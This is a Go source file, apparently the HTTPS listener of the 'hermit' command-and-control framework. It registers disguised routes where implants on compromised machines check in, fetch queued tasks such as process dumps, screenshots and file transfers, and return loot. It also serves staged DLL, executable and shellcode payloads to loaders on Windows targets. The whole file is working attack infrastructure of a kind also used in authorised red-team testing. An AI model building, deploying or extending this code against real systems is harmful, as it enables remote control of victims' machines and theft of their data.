package service

import (
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"strconv"
	"strings"
	"time"

	"github.com/gin-gonic/gin"
	"github.com/google/uuid"
	"github.com/gorilla/websocket"

	"github.com/hideckies/hermit/pkg/common/certs"
	"github.com/hideckies/hermit/pkg/common/meta"
	metafs "github.com/hideckies/hermit/pkg/common/meta/fs"
	"github.com/hideckies/hermit/pkg/common/stdout"
	"github.com/hideckies/hermit/pkg/common/utils"
	"github.com/hideckies/hermit/pkg/server/agent"
	"github.com/hideckies/hermit/pkg/server/db"
	"github.com/hideckies/hermit/pkg/server/listener"
	"github.com/hideckies/hermit/pkg/server/state"
)

var upgrader = websocket.Upgrader{}

type CheckInData struct {
	OS          string `json:"os"`
	Arch        string `json:"arch"`
	Hostname    string `json:"hostname"`
	ListenerURL string `json:"listenerURL"`
	ImplantType string `json:"implantType"`
	Sleep       uint   `json:"sleep"`
	Jitter      uint   `json:"jitter"`
	KillDate    uint   `json:"killDate"`
}

type StagerData struct {
	OS         string `json:"os"`
	Arch       string `json:"arch"`
	Hostname   string `json:"hostname"`
	LoaderType string `json:"loaderType"`
}

// This function is used for verifying the connected agent.
func verifyAgentCheckIn(ag *agent.Agent, ip string, os string, arch string, hostname string) bool {
	if ag.Ip == ip && ag.OS == os && ag.Arch == arch && ag.Hostname == hostname {
		return true
	} else {
		return false
	}
}

func handleImplantCheckIn(lis *listener.Listener, database *db.Database) gin.HandlerFunc {
	fn := func(ctx *gin.Context) {
		clientIP := ctx.ClientIP()

		// Read JSON data
		jsonBytes, err := ctx.GetRawData()
		if err != nil {
			ctx.String(http.StatusBadRequest, "")
			return
		}
		var checkInData CheckInData
		if err := json.Unmarshal(jsonBytes, &checkInData); err != nil {
			ctx.String(http.StatusBadRequest, "")
			return
		}

		// Get check-in date
		checkInDate := meta.GetCurrentDateTime()

		// Check if the agent already exists on the database.
		ags, err := database.AgentGetAll()
		if err != nil {
			ctx.String(http.StatusBadRequest, "")
			return
		}

		var targetAgent *agent.Agent = nil
		for _, ag := range ags {
			if verifyAgentCheckIn(ag, clientIP, checkInData.OS, checkInData.Arch, checkInData.Hostname) {
				targetAgent = ag
				break
			}
		}

		if targetAgent == nil {
			// Add new agent to the database
			targetAgent = agent.NewAgent(
				0,
				uuid.NewString(),
				"",
				clientIP,
				checkInData.OS,
				checkInData.Arch,
				checkInData.Hostname,
				checkInData.ListenerURL,
				checkInData.ImplantType,
				checkInDate,
				checkInData.Sleep,
				checkInData.Jitter,
				checkInData.KillDate,
			)
			if err := database.AgentAdd(targetAgent); err != nil {
				ctx.String(http.StatusBadRequest, "")
				return
			}
		} else {
			// Update the agent info
			targetAgent.Hostname = checkInData.Hostname
			targetAgent.CheckInDate = checkInDate
			if err := database.AgentUpdate(targetAgent); err != nil {
				ctx.String(http.StatusBadRequest, "")
				return
			}
		}

		// Make the agent directory and others
		err = metafs.MakeAgentChildDirs(targetAgent.Name, false)
		if err != nil {
			ctx.String(http.StatusBadRequest, "")
			return
		}

		ctx.String(http.StatusOK, targetAgent.Uuid)
	}
	return gin.HandlerFunc(fn)
}

func handleImplantTaskGet(database *db.Database) gin.HandlerFunc {
	fn := func(ctx *gin.Context) {
		// Get the client UUID
		clientUUID := ctx.GetHeader("X-UUID")

		ags, err := database.AgentGetAll()
		if err != nil {
			ctx.String(http.StatusBadRequest, "")
			return
		}
		var targetAgent *agent.Agent = nil
		for _, ag := range ags {
			if ag.Uuid == clientUUID {
				targetAgent = ag
				break
			}
		}
		if targetAgent == nil {
			ctx.String(http.StatusBadRequest, "")
			return
		}

		// Get tasks
		tasks, err := metafs.ReadAgentTasks(targetAgent.Name, false)
		if err != nil {
			ctx.String(http.StatusBadRequest, "")
			return
		}
		if len(tasks) == 0 {
			ctx.String(http.StatusOK, "")
			return
		}
		// Get the first task and remove it from task list
		task := tasks[0]
		err = metafs.DeleteAgentTask(targetAgent.Name, task, false)
		if err != nil {
			ctx.String(http.StatusBadRequest, "")
			return
		}

		ctx.String(http.StatusOK, task)
	}
	return gin.HandlerFunc(fn)
}

func handleImplantTaskResult(database *db.Database) gin.HandlerFunc {
	fn := func(ctx *gin.Context) {
		// Get the client UUID
		clientUUID := ctx.GetHeader("X-UUID")

		ags, err := database.AgentGetAll()
		if err != nil {
			ctx.String(http.StatusBadRequest, "")
			return
		}

		var targetAgent *agent.Agent = nil
		for _, ag := range ags {
			if ag.Uuid == clientUUID {
				targetAgent = ag
				break
			}
		}
		if targetAgent == nil {
			ctx.String(http.StatusBadRequest, "")
			return
		}

		task := ctx.GetHeader("X-Task")

		// Get the task result.
		data, err := ctx.GetRawData()
		if err != nil {
			ctx.String(http.StatusBadRequest, "")
			return
		}

		content := ""
		switch {
		case strings.HasPrefix(task, "connect "):
			// Update listener URL of the agent on the database.
			targetAgent.ListenerURL = string(data)
			database.AgentUpdate(targetAgent)

			content = "Listener URL has been updated."
		case strings.HasPrefix(task, "download "):
			downloadPath := string(data)
			content = fmt.Sprintf("Downloaded at %s", downloadPath)
		case strings.HasPrefix(task, "procdump "), task == "screenshot":
			// Write a dump file.
			outFile, err := metafs.WriteAgentLootFile(targetAgent.Name, data, false, task)
			if err != nil {
				ctx.String(http.StatusBadRequest, "")
				return
			}
			content = fmt.Sprintf("Saved at %s", outFile)
		case strings.HasPrefix(task, "sleep "):
			sleepTimeStr := strings.Split(task, " ")[1]
			sleepTime, err := strconv.ParseUint(sleepTimeStr, 10, 64)
			if err != nil {
				ctx.String(http.StatusBadRequest, "")
				return
			}
			// Update sleep time on the database
			targetAgent.Sleep = uint(sleepTime)
			err = database.AgentUpdate(targetAgent)
			if err != nil {
				ctx.String(http.StatusBadRequest, "")
				return
			}
			content = "The sleep time has been changed."
		case strings.HasPrefix(task, "upload "):
			uploadPath := string(data)
			content = fmt.Sprintf("Uploaded at %s", uploadPath)
		default:
			content = string(data)
		}

		// Write the task result to a file.
		_, err = metafs.WriteAgentLoot(targetAgent.Name, task, content, false)
		if err != nil {
			ctx.String(http.StatusBadRequest, "")
			return
		}
		ctx.String(http.StatusOK, "OK")
	}
	return gin.HandlerFunc(fn)
}

func handleImplantWebSocket(ctx *gin.Context) {
	stdout.LogSuccess(fmt.Sprintf("Received from %s on WebSocket\n", ctx.ClientIP()))
	w, r := ctx.Writer, ctx.Request
	c, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		stdout.LogInfo(fmt.Sprint(err))
		return
	}
	defer c.Close()
	for {
		mt, message, err := c.ReadMessage()
		if err != nil {
			stdout.LogInfo(fmt.Sprint(err))
			break
		}
		stdout.LogSuccess(fmt.Sprintf("received: %s", message))
		err = c.WriteMessage(mt, message)
		if err != nil {
			stdout.LogFailed(fmt.Sprint(err))
			break
		}
	}
}

func handleDownload(database *db.Database) gin.HandlerFunc {
	fn := func(ctx *gin.Context) {
		// Get the client UUID
		clientUUID := ctx.GetHeader("X-UUID")

		// Check if the agent exists on the database
		ags, err := database.AgentGetAll()
		if err != nil {
			ctx.String(http.StatusBadRequest, "")
			return
		}
		agentExists := false
		for _, ag := range ags {
			if ag.Uuid == clientUUID {
				agentExists = true
				break
			}
		}
		if !agentExists {
			ctx.String(http.StatusBadRequest, "")
			return
		}

		w := ctx.Writer
		header := w.Header()
		header.Set("Transfer-Encoding", "chunked")
		header.Set("Content-Type", "application/octet-stream")

		// Read the request data (file path to download)
		filenameBytes, err := ctx.GetRawData()
		if err != nil {
			w.WriteHeader(http.StatusBadRequest)
			w.(http.Flusher).Flush()
			return
		}
		filename := string(filenameBytes)

		// Prepare the file
		data, err := os.ReadFile(filename)
		if err != nil {
			w.WriteHeader(http.StatusBadRequest)
			w.(http.Flusher).Flush()
			return
		}

		// Send chunked data
		w.WriteHeader(http.StatusOK)
		chunkedData := utils.ChunkData(data)
		for _, c := range chunkedData {
			w.Write(c)
			w.(http.Flusher).Flush()
			time.Sleep(time.Duration(1) * time.Second)
		}
	}
	return gin.HandlerFunc(fn)
}

func handleUpload(database *db.Database) gin.HandlerFunc {
	fn := func(ctx *gin.Context) {
		// Get the client UUID
		clientUUID := ctx.GetHeader("X-UUID")

		// Get the agent
		ags, err := database.AgentGetAll()
		if err != nil {
			ctx.String(http.StatusBadRequest, "")
			return
		}
		var targetAgent *agent.Agent = nil
		for _, ag := range ags {
			if ag.Uuid == clientUUID {
				targetAgent = ag
				break
			}
		}
		if targetAgent == nil {
			ctx.String(http.StatusBadRequest, "")
			return
		}

		// Get the download path
		downloadPath := ctx.GetHeader("X-File")
		// Check if the file already exists
		if _, err := os.Stat(downloadPath); err == nil {
			ctx.String(http.StatusBadRequest, "")
			return
		}

		// Read data from the file
		data, err := ctx.GetRawData()
		if err != nil {
			ctx.String(http.StatusBadRequest, "")
			return
		}

		// Save the file
		err = os.WriteFile(downloadPath, data, 0644)
		if err != nil {
			ctx.String(http.StatusBadRequest, "")
			return
		}

		ctx.String(http.StatusOK, "")
	}
	return gin.HandlerFunc(fn)
}

func handleStagerDownload(lis *listener.Listener) gin.HandlerFunc {
	fn := func(ctx *gin.Context) {
		w := ctx.Writer
		header := w.Header()
		header.Set("Transfer-Encoding", "chunked")
		header.Set("Content-Type", "application/octet-stream")

		// Read JSON data
		jsonBytes, err := ctx.GetRawData()
		if err != nil {
			ctx.String(http.StatusBadRequest, "")
			return
		}
		var stgData StagerData
		if err := json.Unmarshal(jsonBytes, &stgData); err != nil {
			ctx.String(http.StatusBadRequest, "")
			return
		}

		// Get all payload paths generated under '~/.hermit/server/listeners/<listner>/payloads'.
		payloadPaths, err := metafs.GetListenerPayloadPaths(lis.Name, false, false)
		if err != nil {
			w.WriteHeader(http.StatusBadRequest)
			w.(http.Flusher).Flush()
			return
		}

		targetPayloadPath := ""
		for _, payloadPath := range payloadPaths {
			// TODO: more accurate check for file info

			if stgData.OS == "linux" {
				// TODO
				// ...
			}
			if stgData.OS == "windows" {
				if stgData.LoaderType == "dll-loader" {
					// Load a DLL file.
					if stgData.Arch == "amd64" {
						if strings.HasSuffix(payloadPath, ".amd64.dll") {
							targetPayloadPath = payloadPath
							break
						}
					} else if stgData.Arch == "i686" {
						if strings.HasSuffix(payloadPath, ".i686.dll") {
							targetPayloadPath = payloadPath
							break
						}
					}
				} else if stgData.LoaderType == "exec-loader" {
					// Load an executable file.
					if stgData.Arch == "amd64" {
						if strings.HasSuffix(payloadPath, ".amd64.exe") {
							targetPayloadPath = payloadPath
							break
						}
					} else if stgData.Arch == "i686" {
						if strings.HasSuffix(payloadPath, ".i686.exe") {
							targetPayloadPath = payloadPath
							break
						}
					}
				} else if stgData.LoaderType == "shellcode-loader" {
					// Load a shellcode (raw) file.
					if stgData.Arch == "amd64" {
						if strings.HasSuffix(payloadPath, ".x64.bin") {
							targetPayloadPath = payloadPath
						}
					} else if stgData.Arch == "i686" {
						if strings.HasSuffix(payloadPath, ".x86.bin") {
							targetPayloadPath = payloadPath
						}
					}
					if strings.HasSuffix(payloadPath, ".bin") {
						targetPayloadPath = payloadPath
						break
					}
				}
			}
		}
		if targetPayloadPath == "" {
			// TODO: If there are not target payloads, set default paylaod.
			// ...
			w.WriteHeader(http.StatusBadRequest)
			w.(http.Flusher).Flush()
			return
		}

		// Read data from the payload.
		data, err := os.ReadFile(targetPayloadPath)
		if err != nil {
			w.WriteHeader(http.StatusBadRequest)
			w.(http.Flusher).Flush()
			return
		}

		// Send chunked data
		w.WriteHeader(http.StatusOK)
		chunkedData := utils.ChunkData(data)
		for _, c := range chunkedData {
			w.Write(c)
			w.(http.Flusher).Flush()
			time.Sleep(time.Duration(1) * time.Second)
		}
	}
	return gin.HandlerFunc(fn)
}

func httpsRoutes(
	router *gin.Engine,
	lis *listener.Listener,
	serverState *state.ServerState,
) {
	fakeRoutes := serverState.Conf.Listener.FakeRoutes

	for _, r := range fakeRoutes["/implant/checkin"] {
		router.POST(r, handleImplantCheckIn(lis, serverState.DB))
	}
	for _, r := range fakeRoutes["/implant/task/get"] {
		router.GET(r, handleImplantTaskGet(serverState.DB))
	}
	for _, r := range fakeRoutes["/implant/task/result"] {
		router.POST(r, handleImplantTaskResult(serverState.DB))
	}
	for _, r := range fakeRoutes["/implant/websocket"] {
		router.GET(r, handleImplantWebSocket)
	}
	for _, r := range fakeRoutes["/download"] {
		router.POST(r, handleDownload(serverState.DB))
	}
	for _, r := range fakeRoutes["/upload"] {
		router.POST(r, handleUpload(serverState.DB))
	}
	for _, r := range fakeRoutes["/stager/download"] {
		router.POST(r, handleStagerDownload(lis))
	}
}

func HttpsStart(
	lis *listener.Listener,
	serverState *state.ServerState,
) error {
	// Get server certificate paths
	serverCertPath, serverKeyPath, err := certs.GetCertificatePath(certs.CATYPE_HTTPS, false, false, lis.Name)
	if err != nil {
		return err
	}

	gin.SetMode(gin.ReleaseMode)
	router := gin.New()
	router.HandleMethodNotAllowed = false
	router.Use(gin.Recovery())

	httpsRoutes(router, lis, serverState)

	srv := &http.Server{
		Addr:    fmt.Sprintf("%s:%d", lis.Addr, lis.Port),
		Handler: router,
	}

	go func() {
		for {
			select {
			case uuid := <-serverState.Job.ChReqListenerQuit:
				if uuid == lis.Uuid {
					if err := srv.Close(); err != nil {
						serverState.Job.ChListenerError <- lis.Uuid
						break
					}
				} else {
					continue
				}
			default:
			}
		}
	}()

	serverState.Job.ChListenerReady <- lis.Uuid

	if err := srv.ListenAndServeTLS(serverCertPath, serverKeyPath); err != nil {
		if err == http.ErrServerClosed {
			serverState.Job.ChListenerQuit <- lis.Uuid
			return nil
		} else {
			return err
		}
	}

	return nil
}
